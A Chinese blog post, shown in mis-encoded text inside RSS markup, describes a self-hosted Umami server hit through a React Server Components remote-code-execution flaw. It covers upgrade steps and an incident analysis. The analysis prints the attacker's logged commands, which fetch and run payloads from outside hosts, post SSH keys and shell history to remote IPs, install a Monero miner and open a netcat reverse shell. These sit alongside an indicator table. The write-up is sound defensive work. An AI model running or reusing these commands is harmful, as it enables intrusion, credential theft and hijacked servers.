th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.cosine.ren%2Fpost%2Freact-cve-2025" target="_blank" title="https://blog.cosine.ren/post/react-cve-2025" ref="nofollow noopener noreferrer">blog.cosine.ren/post/react-â€¦</a></p>
<blockquote>
<p>æˆ‘å¯¹å®‰å…¨æ–¹é¢çš„çŸ¥è¯†å¾ˆå°‘ï¼Œæœ¬æ–‡å¤§éƒ¨åˆ†å¯èƒ½æœ‰å¾ˆå¤šé”™æ¼ï¼Œå¦‚æœ‰é”™æ¼å¸Œæœ›èƒ½æŒ‡å‡ºã€‚</p>
</blockquote>
<p>2025 å¹´ 12 æœˆ 3 æ—¥ï¼ŒReact å‘å¸ƒäº†ä¸€ä¸ªå ªæ¯”å½“å¹´ Log4j çš„<strong>ä¸¥é‡å®‰å…¨æ¼æ´</strong>ï¼šCVE-2025-55182ï¼ŒCVSS è¯„åˆ† <strong>10.0 æ»¡åˆ†</strong>ï¼</p>
<p>è¿™æ˜¯ React å†å²ä¸Šæœ€ä¸¥é‡çš„æ¼æ´ä¹‹ä¸€ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰ã€‚</p>
<p>åˆšæ”¶åˆ°å®‰å…¨é€šå‘Šï¼Œæˆ‘å°±é©¬ä¸Šæ›´æ–°äº†æ‰€æœ‰å·²çŸ¥çš„ Next.js å’Œ React åº”ç”¨ï¼Œä»¥ä¸ºè¿™äº›åº”è¯¥æ²¡äº‹å„¿äº†ã€‚</p>
<p>ç»“æœä»Šå¤©çªç„¶å‘ç°è‡ªå»ºçš„ Umami æœåŠ¡ 504 äº†æ‰æƒ³èµ·æ¥ï¼Œæ²ƒæ—¥ï¼Œå®ƒæ˜¯ Nextjs å†™çš„å•Šï¼ï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e783364bc2c3499ebc2e2b3977b54008~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=834nkbJcqi5MWU0EAEzDhQrm1Hg%3D" alt="" loading="lazy"/></p>
<p>è™½ç„¶æ˜¯åœ¨ docker é‡Œè·‘çš„ï¼Œå¹¶ä¸”ç‚¸çš„æ˜¯æˆ‘ä¸€ä¸ªä¸å¸¸ç”¨çš„æœåŠ¡å™¨ï¼Œæœ€å¤§çš„æŸå¤±æ˜¯ CPU å ç”¨ç‡çªç„¶é£™åˆ° 100% äº†ä¸€æ®µæ—¶é—´ï¼Œç»Ÿè®¡æ•°æ®ä¸¢äº†ä¸å°‘ï¼Œå¯†ç ä»€ä¹ˆçš„éƒ½æ˜¯éšæœºç”Ÿæˆçš„ï¼Œæ¢å°±å¥½äº†ã€‚</p>
<p>éšä¾¿æ‰¾äº†ä¸€ç¯‡åšå®¢çœ‹çœ‹åˆ«äººçš„æƒ…å†µï¼š</p>
<p><a href="https://juejin.cn/post/7580374090365665318" target="_blank" title="https://juejin.cn/post/7580374090365665318">juejin.cn/post/758037â€¦</a></p>
<h2 data-id="heading-0">è§£å†³æ–¹æ¡ˆ</h2>
<p>å…ˆæŠŠæœ€ç»ˆçš„è§£å†³æ–¹æ¡ˆæ”¾åˆ°æœ€å‰é¢ã€‚</p>
<p>å‡çº§ Umamiï¼Œé¦–å…ˆä½¿ç”¨ pg_dump å¤‡ä»½ Umami çš„ PostgreSQL æ•°æ®åº“ã€‚è¿™é‡Œæœ‰å‡ ç§æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¤‡ä»½åˆ°å½“å‰ç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; umami_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d_%H%M%S).sql

<span class="hljs-comment"># æˆ–è€…å¤‡ä»½åˆ°æŒ‡å®šç›®å½•</span>
docker <span class="hljs-built_in">exec</span> umami-db-1 pg_dump -U umami umami &gt; ~/backups/umami_$(<span class="hljs-built_in">date</span> +%Y%m%d).sql
</code></pre>
<p>ç„¶åï¼Œå› ä¸ºæˆ‘æ˜¯ docker-compose éƒ¨ç½²çš„ï¼Œç›´æ¥ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">docker compose pull
docker compose up --force-recreate -d
</code></pre>
<p>å°±å¯ä»¥äº†ï¼ŒæŸ¥çœ‹å®¹å™¨æ—¥å¿—ä¸­çš„ Next.js å·²ç»æ˜¯ 15.5.7 ç‰ˆæœ¬ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c72ed119ee4460ca40ae3e1ab756abb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgY29z:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765772438&amp;x-signature=q%2BInUj%2FyhqB5By5yASac7uX386o%3D" alt="" loading="lazy"/></p>
<p>å¦‚æœä½ æ•°æ®åº“ä½¿ç”¨çš„æ˜¯ mysql çš„è¯ï¼Œé‚£ä¸è¦å‡ 3ï¼Œçœ‹å®˜æ–¹çš„è¿ç§»æ•™ç¨‹</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.umami.is%2Fdocs%2Fguides%2Fmigrate-mysql-postgresql" target="_blank" title="https://docs.umami.is/docs/guides/migrate-mysql-postgresql" ref="nofollow noopener noreferrer">docs.umami.is/docs/guidesâ€¦</a></p>
<h2 data-id="heading-1">æ¼æ´èƒŒæ™¯</h2>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">www.cve.org/CVERecord?iâ€¦</a></p>
<ul>
<li><strong>CVE ç¼–å·</strong>: CVE-2025-55182</li>
<li><strong>CVSS è¯„åˆ†</strong>: 10.0 / 10.0ï¼ˆCriticalï¼‰</li>
<li><strong>æ¼æ´ç±»å‹</strong>: æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆUnauthenticated RCEï¼‰</li>
<li><strong>æŠ«éœ²æ—¶é—´</strong>: 2025 å¹´ 12 æœˆ 3 æ—¥</li>
<li><strong>å®˜æ–¹å…¬å‘Š</strong>: <a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog</a></li>
</ul>
<h3 data-id="heading-2">å—å½±å“çš„ç‰ˆæœ¬</h3>
<p><strong>React æ ¸å¿ƒåŒ…ï¼ˆ19.x ç‰ˆæœ¬ï¼‰</strong>:</p>
<p>19.0, 19.1.0, 19.1.1 å’Œ 19.2.0</p>
<ul>
<li>react-server-dom-webpack</li>
<li>react-server-dom-parcel</li>
<li>react-server-dom-turbopack</li>
</ul>
<p><strong>å—å½±å“çš„æ¡†æ¶</strong>:</p>
<ul>
<li><strong>Next.js</strong>: 14.3.0-canary.77 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œ15.x, 16.x å…¨éƒ½éœ€è¦å‡åˆ°æœ€æ–°ç‰ˆæœ¬</li>
<li>React Router: ä½¿ç”¨ unstable RSC APIs çš„ç‰ˆæœ¬</li>
<li>Waku: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Expo: ä½¿ç”¨ RSC çš„ç‰ˆæœ¬</li>
<li>Redwood SDK: &lt; 1.0.0-alpha.0</li>
</ul>
<h3 data-id="heading-3">æ¼æ´åŸç†</h3>
<p>React Server Functions å…è®¸å®¢æˆ·ç«¯è°ƒç”¨æœåŠ¡å™¨ä¸Šçš„å‡½æ•°ã€‚React å°†å®¢æˆ·ç«¯è¯·æ±‚è½¬æ¢ä¸º HTTP è¯·æ±‚å‘é€åˆ°æœåŠ¡å™¨ï¼Œåœ¨æœåŠ¡å™¨ç«¯ React å†å°† HTTP è¯·æ±‚<strong>ååºåˆ—åŒ–</strong>ä¸ºå‡½æ•°è°ƒç”¨ã€‚</p>
<p><strong>å…³é”®é—®é¢˜</strong>ï¼šæ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„ HTTP è¯·æ±‚åˆ°ä»»ä½• React Server Function ç«¯ç‚¹ï¼Œå½“ React ååºåˆ—åŒ–è¿™äº› payload æ—¶ï¼Œä¼šè§¦å‘<strong>ä»»æ„ä»£ç æ‰§è¡Œ</strong>ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ç®€åŒ–çš„æ¼æ´ç¤ºæ„ï¼ˆå®é™…æ›´å¤æ‚ï¼‰</span>
<span class="hljs-comment">// æœåŠ¡å™¨ç«¯çš„ React Server Function å¤„ç†</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">handleServerFunctionRequest</span>(<span class="hljs-params">payload</span>) {
  <span class="hljs-comment">// âŒ å±é™©ï¼šç›´æ¥ååºåˆ—åŒ–æœªéªŒè¯çš„ payload</span>
  <span class="hljs-keyword">const</span> deserializedData = <span class="hljs-title function_">deserialize</span>(payload);

  <span class="hljs-comment">// å¦‚æœ payload è¢«ç²¾å¿ƒæ„é€ ï¼Œè¿™é‡Œå¯èƒ½æ‰§è¡Œä»»æ„ä»£ç </span>
  <span class="hljs-keyword">return</span> <span class="hljs-title function_">executeFunction</span>(deserializedData);
}
</code></pre>
<p><strong>å…³é”®å¨èƒ</strong>ï¼š</p>
<ul>
<li>æ— éœ€èº«ä»½éªŒè¯ï¼ˆUnauthenticatedï¼‰</li>
<li>è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰</li>
<li>å³ä½¿æ²¡æœ‰å®šä¹‰ä»»ä½• Server Functionï¼Œåªè¦ä½¿ç”¨äº† React Server Components å°±æœ‰é£é™©</li>
</ul>
<h2 data-id="heading-4">æ”»å‡»æ‰‹æ®µ</h2>
<p>æ—¢ç„¶æ”»å‡»éƒ½å·²ç»æ”»å‡»äº†ï¼Œé‚£ä¸å¦‚è¶æœºè®© AI åˆ†æå®¹å™¨æ—¥å¿—ï¼Œå€Ÿæ­¤æœºä¼šæ·±å…¥åˆ†æä¸€ä¸‹æ”»å‡»è€…åˆ°åº•æƒ³å¹²ä»€ä¹ˆã€‚</p>
<p><strong>ä»¥ä¸‹æ”»å‡»æ‰‹æ®µæ±‡æ€»ç­‰ï¼Œå…¨ä¸º Claude Sonnet 4.5 æ ¹æ®æ—¥å¿—æ–‡ä»¶è¿›è¡Œåˆ†æå¾—å‡ºçš„æ€»ç»“ï¼Œå¦‚æœ‰é”™æ¼ï¼Œè¿˜è¯·æŒ‡å‡ºã€‚</strong></p>
<h3 data-id="heading-5">æ”»å‡»å…¥å£ï¼šReact Server Components RCE</h3>
<p>ä»æ—¥å¿—ä¸­å¯ä»¥çœ‹åˆ°å¤§é‡çš„ <code>NEXT_REDIRECT</code> é”™è¯¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"> â¨¯ Error: NEXT_REDIRECT
    at Object.<span class="hljs-built_in">eval</span> [as <span class="hljs-keyword">then</span>] (node_modules/next/dist/compiled/next-server/app-page.runtime.prod.js:92:34014) {
  digest: <span class="hljs-string">'12334\nMEOWWWWWWWWW'</span>
}
</code></pre>
<p><strong>è¿™æ˜¯æ¼æ´åˆ©ç”¨çš„æ ‡å¿—æ€§ç‰¹å¾</strong>ï¼š</p>
<ul>
<li><code>digest: '12334\nMEOWWWWWWWWW'</code> - è¿™ä¸æ˜¯æ­£å¸¸çš„é”™è¯¯æ‘˜è¦</li>
<li>æ”»å‡»è€…é€šè¿‡æ„é€ æ¶æ„ payload è§¦å‘ React Server Components çš„ååºåˆ—åŒ–æ¼æ´</li>
<li>æ¯æ¬¡ NEXT_REDIRECT é”™è¯¯åéƒ½è·Ÿç€ä¸€ç³»åˆ—çš„ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œå°è¯•</li>
</ul>
<h3 data-id="heading-6">æ¼æ´åˆ©ç”¨ä¸åˆå§‹è®¿é—®</h3>
<p>æ”»å‡»è€…é¦–å…ˆåˆ©ç”¨ CVE-2025-55182 è·å¾—ä»£ç æ‰§è¡Œèƒ½åŠ›ï¼Œç„¶åç«‹å³å°è¯•ä¸‹è½½åé—¨ç¨‹åºï¼š</p>
<pre><code class="hljs language-bash" lang="bash">Connecting to 193.34.213.150 (193.34.213.150:80)
wget: can<span class="hljs-string">'t open '</span>x86<span class="hljs-string">': Permission denied
chmod: x86: No such file or directory
/bin/sh: ./x86: not found
</span></code></pre>
<p><strong>æ”»å‡»æµç¨‹</strong>ï¼š</p>
<ol>
<li>å‘ React Server Function ç«¯ç‚¹å‘é€æ¶æ„ payload</li>
<li>è§¦å‘ååºåˆ—åŒ–æ¼æ´ï¼Œæ‰§è¡Œ <code>wget</code> å‘½ä»¤</li>
<li>å°è¯•ä» C&amp;C æœåŠ¡å™¨ä¸‹è½½ <code>x86</code> æ¶æ„ç¨‹åºï¼ˆä¸€ä¸ª Linux ELF äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</li>
<li>å°è¯•èµ‹äºˆæ‰§è¡Œæƒé™å¹¶è¿è¡Œ</li>
</ol>
<p><strong>å¦‚æœæˆåŠŸä¼šæ€æ ·ï¼Ÿ</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># æ”»å‡»è€…æƒ³åšçš„äº‹æƒ…ï¼ˆè¢«é˜»æ­¢äº†ï¼‰</span>
wget http://193.34.213.150/x86
<span class="hljs-built_in">chmod</span> +x x86
./x86  <span class="hljs-comment"># è¿™ä¼šå®‰è£…ä¸€ä¸ªåé—¨ç¨‹åº</span>
</code></pre>
<h3 data-id="heading-7">å‡­è¯çªƒå–</h3>
<p>æ”»å‡»è€…æƒ³è¦çªƒå–æ‰€æœ‰æœ‰ä»·å€¼çš„å‡­è¯ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°è¯• 1ï¼šçªƒå– SSH ç§é’¥</span>
Connecting to 23.19.231.97:36169 (23.19.231.97:36169)
wget: can<span class="hljs-string">'t open '</span>/root/.ssh/id_rsa<span class="hljs-string">': Permission denied
wget --post-file=/root/.ssh/id_rsa http://23.19.231.97:36169/222

# å°è¯• 2ï¼šçªƒå– ECDSA ç§é’¥
wget --post-file=/root/.ssh/id_ecdsa http://23.19.231.97:47023/222

# å°è¯• 3ï¼šçªƒå–å‘½ä»¤å†å²ï¼ˆå¯èƒ½åŒ…å«å¯†ç ï¼‰
cat: can'</span>t open <span class="hljs-string">'/root/.bash_history'</span>: Permission denied
wget --post-data=<span class="hljs-string">"<span class="hljs-subst">$(cat /root/.bash_history)</span>"</span> http://23.19.231.97:44719/222
</code></pre>
<p><strong>è¿™æ˜¯æ•´ä¸ªæ”»å‡»ä¸­æœ€æ¶æ¯’çš„éƒ¨åˆ†</strong>ï¼š</p>
<ul>
<li>SSH ç§é’¥å¯ä»¥è®©æ”»å‡»è€…æ¨ªå‘ç§»åŠ¨åˆ°å…¶ä»–æœåŠ¡å™¨</li>
<li><code>.bash_history</code> å¯èƒ½åŒ…å«ï¼š
<ul>
<li>æ•°æ®åº“å¯†ç </li>
<li>API å¯†é’¥</li>
<li>äº‘æœåŠ¡å‡­è¯ï¼ˆAWSã€GCP ç­‰ï¼‰</li>
<li>å†…éƒ¨ç³»ç»Ÿåœ°å€</li>
</ul>
</li>
</ul>
<h3 data-id="heading-8">æŒä¹…åŒ–åé—¨</h3>
<p>æ”»å‡»è€…å°è¯•å»ºç«‹å¤šä¸ªåé—¨ä»¥ä¿æŒè®¿é—®ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä¼ªè£…æˆå¥åº·æ£€æŸ¥è„šæœ¬</span>
sh: can<span class="hljs-string">'t create /dev/health.sh: Permission denied
chmod: /dev/health.sh: No such file or directory

# å°è¯•ä»å¤šä¸ªæºä¸‹è½½æ¶æ„è„šæœ¬
(curl -s -k https://repositorylinux.xyz/cron.sh || \
 wget --no-check-certificate -q -O- https://repositorylinux.xyz/cron.sh) | bash

# Windows PowerShell ç¼–ç å‘½ä»¤ï¼ˆè‡ªåŠ¨åŒ–è„šæœ¬ï¼‰
powershell -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAC4ALgAu
</span></code></pre>
<p><strong>è§£ç  PowerShell å‘½ä»¤</strong>ï¼š</p>
<pre><code class="hljs language-powershell" lang="powershell"># Base64 è§£ç åçš„å†…å®¹
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://repositorylinux.xyz/script_kill.ps1')
</code></pre>
<p>è¿™æ˜¯ä¸€ä¸ª<strong>è·¨å¹³å°æ”»å‡»</strong>ï¼šåŒæ—¶å°è¯• Linux (bash) å’Œ Windows (PowerShell) å‘½ä»¤ã€‚</p>
<h3 data-id="heading-9">åŠ å¯†è´§å¸æŒ–çŸ¿</h3>
<p>æœ€è€—èµ„æºçš„éƒ¨åˆ† - è¿™å°±æ˜¯ CPU é£™åˆ° 100% çš„åŸå› ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># C3Pool æŒ–çŸ¿æ± å®‰è£…è„šæœ¬</span>
curl -sLk https://gist.githubusercontent.com/demonic-agents/39e943f4de855e2aef12f34324cbf150/raw/e767e1cef1c35738689ba4df9c6f7f29a6afba1a/setup_c3pool_miner.sh | \
bash -s 49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKkXERKUB7pXqBHfK1CcjLtMMnTF3J12KZJ83EQCBjT75Stbv

<span class="hljs-comment"># XMRig Monero æŒ–çŸ¿ç¨‹åº</span>
powershell -EncodedCommand [Base64 encoded mining script]
</code></pre>
<p><strong>æŒ–çŸ¿æ”»å‡»ç‰¹å¾</strong>ï¼š</p>
<ul>
<li>é’±åŒ…åœ°å€ï¼š<code>49Cf4UaH5mVF2QCBRECpwSWV1C6hPgVWC8vZZkjgjjdYegZKk...</code>ï¼ˆMoneroï¼‰</li>
<li>çŸ¿æ± ï¼šC3Pool</li>
<li>è¿™ä¼šæ¶ˆè€—æ‰€æœ‰ CPU èµ„æºï¼Œå¯¼è‡´ï¼š- æœåŠ¡å“åº”ç¼“æ…¢ - æœåŠ¡å™¨å®•æœº - äº‘æœåŠ¡è´¦å•æš´å¢
ï¼ˆè¿˜å¥½æ˜¯è‡ªå·±æœåŠ¡å™¨ï¼‰</li>
</ul>
<h3 data-id="heading-10">åå‘ Shell</h3>
<p>å°è¯•å»ºç«‹è¿œç¨‹æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">rm</span>: can<span class="hljs-string">'t remove '</span>/tmp/f<span class="hljs-string">': No such file or directory
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2&gt;&amp;1 | nc 171.252.32.135 7700 &gt;/tmp/f
</span></code></pre>
<p><strong>åå‘ Shell æŠ€æœ¯åˆ†æ</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># è¿™æ˜¯ä¸€ä¸ªç»å…¸çš„å‘½åç®¡é“åå‘ shell</span>
<span class="hljs-built_in">mkfifo</span> /tmp/f              <span class="hljs-comment"># åˆ›å»ºå‘½åç®¡é“</span>
<span class="hljs-built_in">cat</span> /tmp/f | bash -i 2&gt;&amp;1  <span class="hljs-comment"># ä»ç®¡é“è¯»å–å‘½ä»¤å¹¶æ‰§è¡Œ</span>
| nc 171.252.32.135 7700   <span class="hljs-comment"># é€šè¿‡ netcat è¿æ¥åˆ° C&amp;C æœåŠ¡å™¨</span>
&gt;/tmp/f                    <span class="hljs-comment"># å°†è¾“å‡ºå†™å›ç®¡é“</span>
</code></pre>
<p>å¦‚æœæˆåŠŸï¼Œæ”»å‡»è€…å°±å¯ä»¥ï¼š</p>
<ul>
<li>å®æ—¶æ§åˆ¶æœåŠ¡å™¨</li>
<li>æ‰§è¡Œä»»æ„å‘½ä»¤</li>
<li>çªƒå–å®æ—¶æ•°æ®</li>
<li>ä½œä¸ºè·³æ¿æ”»å‡»å†…ç½‘</li>
</ul>
<h3 data-id="heading-11">æ”»å‡»æŒ‡æ ‡ï¼ˆIoCï¼‰æ±‡æ€»</h3>













































<table><thead><tr><th>ç±»å‹</th><th>å€¼</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>æ¶æ„ IP</td><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘</td></tr><tr><td>æ¶æ„ IP</td><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td></tr><tr><td>æ¶æ„ IP</td><td>171.252.32.135</td><td>åå‘ Shell C2</td></tr><tr><td>æ¶æ„åŸŸå</td><td>repositorylinux.xyz</td><td>è„šæœ¬åˆ†å‘</td></tr><tr><td>æ¶æ„åŸŸå</td><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†</td></tr><tr><td>GitHub Gist</td><td>demonic-agents/39e943f4...</td><td>æŒ–çŸ¿è„šæœ¬</td></tr></tbody></table>
<h3 data-id="heading-12">æ¶æ„ IP åœ°å€</h3>






























<table><thead><tr><th>IP åœ°å€</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>193.34.213.150</td><td>æ¶æ„è½¯ä»¶åˆ†å‘ï¼ˆx86 äºŒè¿›åˆ¶æ–‡ä»¶ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>23.19.231.97</td><td>æ•°æ®çªƒå–æœåŠ¡å™¨ï¼ˆSSH å¯†é’¥ã€å†å²è®°å½•ï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>89.144.31.18</td><td>å¤‡ç”¨æ¶æ„æœåŠ¡å™¨</td><td>ğŸŸ  High</td></tr><tr><td>171.252.32.135</td><td>åå‘ Shell C&amp;C æœåŠ¡å™¨</td><td>ğŸ”´ Critical</td></tr></tbody></table>
<h3 data-id="heading-13">æ¶æ„åŸŸå</h3>




















<table><thead><tr><th>åŸŸå</th><th>ç”¨é€”</th><th>å¨èƒç­‰çº§</th></tr></thead><tbody><tr><td>repositorylinux.xyz</td><td>æ¶æ„è„šæœ¬åˆ†å‘ï¼ˆcron.sh, linux.sh, firewall.shï¼‰</td><td>ğŸ”´ Critical</td></tr><tr><td>dashboard.checkstauts.site</td><td>ç›‘æ§ä»£ç†/æ•°æ®æ”¶é›†</td><td>ğŸŸ  High</td></tr></tbody></table>
<h3 data-id="heading-14">æ¶æ„èµ„æº</h3>




















<table><thead><tr><th>èµ„æº</th><th>ç±»å‹</th><th>ç”¨é€”</th></tr></thead><tbody><tr><td>github.com/demonic-agents/39e943f4...</td><td>GitHub Gist</td><td>C3Pool æŒ–çŸ¿è„šæœ¬</td></tr><tr><td>49Cf4UaH5mVF2QCBRECpwSWV1C6h...</td><td>Monero é’±åŒ…</td><td>æŒ–çŸ¿æ”¶ç›Šåœ°å€</td></tr></tbody></table>
<h2 data-id="heading-15">ä¸ºä»€ä¹ˆæ‰€æœ‰æ”»å‡»éƒ½å¤±è´¥äº†ï¼Ÿ</h2>
<p>å› ä¸ºè¿˜å¥½æ˜¯ Docker è·‘çš„ï¼ŒDocker å®¹å™¨æƒé™éš”ç¦»ï¼Œæˆ‘çš„ Umami å®¹å™¨ï¼š</p>
<ul>
<li>é root ç”¨æˆ·è¿è¡Œï¼Œæ— æ³•å†™å…¥ç³»ç»Ÿç›®å½•</li>
<li>åªè¯»æ–‡ä»¶ç³»ç»Ÿï¼Œæ— æ³•åˆ›å»ºæ¶æ„æ–‡ä»¶</li>
<li>ä¸¢å¼ƒæ‰€æœ‰ Linux Capabilities</li>
<li>ç¦æ­¢ææƒæ“ä½œ</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">Permission denied (é‡å¤ 100+ æ¬¡)
</code></pre>
<p>å‡ ä¹æ‰€æœ‰æ”»å‡»æ“ä½œéƒ½é‡åˆ°äº†æƒé™æ‹’ç»ï¼š</p>
<ul>
<li>æ— æ³•å†™å…¥ <code>/root/.ssh/</code></li>
<li>æ— æ³•åœ¨ <code>/dev/</code> åˆ›å»ºæ–‡ä»¶</li>
<li>æ— æ³•åœ¨ <code>/tmp/</code> åˆ›å»ºç®¡é“</li>
<li>æ— æ³•æ‰§è¡Œä¸‹è½½çš„äºŒè¿›åˆ¶æ–‡ä»¶</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">/bin/sh: bash: not found
/bin/sh: powershell: not found
spawn calc.exe ENOENT
</code></pre>
<p>å®¹å™¨æ˜¯æœ€å°åŒ–é•œåƒï¼Œä¸åŒ…å« bashï¼Œè¿™å¯¼è‡´è®¸å¤šæ”»å‡»è„šæœ¬æ— æ³•æ‰§è¡Œã€‚</p>
<h2 data-id="heading-16">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Fblog%2F2025%2F12%2F03%2Fcritical-security-vulnerability-in-react-server-components" target="_blank" title="https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">React Blog - Critical Security Vulnerability</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Flachlan2k" target="_blank" title="https://github.com/lachlan2k" ref="nofollow noopener noreferrer">Lachlan Davidson's Blog</a>ï¼ˆå‘ç°è€…ï¼‰</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cve.org%2FCVERecord%3Fid%3DCVE-2025-55182" target="_blank" title="https://www.cve.org/CVERecord?id=CVE-2025-55182" ref="nofollow noopener noreferrer">CVE-2025-55182 è¯¦æƒ…</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnextjs.org%2Fblog%2FCVE-2025-66478" target="_blank" title="https://nextjs.org/blog/CVE-2025-66478" ref="nofollow noopener noreferrer">Next.js Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fexpo.dev%2Fchangelog%2Fmitigating-critical-security-vulnerability-in-react-server-components" target="_blank" title="https://expo.dev/changelog/mitigating-critical-security-vulnerability-in-react-server-components" ref="nofollow noopener noreferrer">Expo Security Advisory</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fwakujs%2Fwaku%2Fdiscussions%2F1823" target="_blank" title="https://github.com/wakujs/waku/discussions/1823" ref="nofollow noopener noreferrer">Waku Discussion</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.2é‡å¤§å‡çº§ï¼šæ­ç§˜10å€æ€§èƒ½æå‡çš„5ä¸ªæ ¸å¿ƒä¼˜åŒ–ç‚¹]]></title>    <link>https://juejin.cn/post/7580809247736528936</link>    <guid>https://juejin.cn/post/7580809247736528936</guid>    <pubDate>2025-12-08T04:16:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" 